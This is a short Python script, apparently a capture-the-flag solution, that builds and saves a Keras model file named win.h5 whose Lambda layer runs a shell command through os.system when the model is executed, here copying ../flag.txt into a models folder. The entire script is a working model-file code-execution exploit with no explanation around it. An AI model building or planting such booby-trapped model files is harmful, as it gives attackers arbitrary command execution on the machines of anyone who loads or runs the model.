import keras
import tensorflow as tf
from keras import Input
from keras.models import load_model



exploit_lambda = tf.keras.layers.Lambda(lambda x: x if __import__('os').system('cp ../flag.txt ./models/flag.txt') else x, name='exploit')
lambda_model = keras.models.Model(Input(()), exploit_lambda(Input(())))
lambda_model.compile()
lambda_model.save('win.h5')
lambda_model.summary()


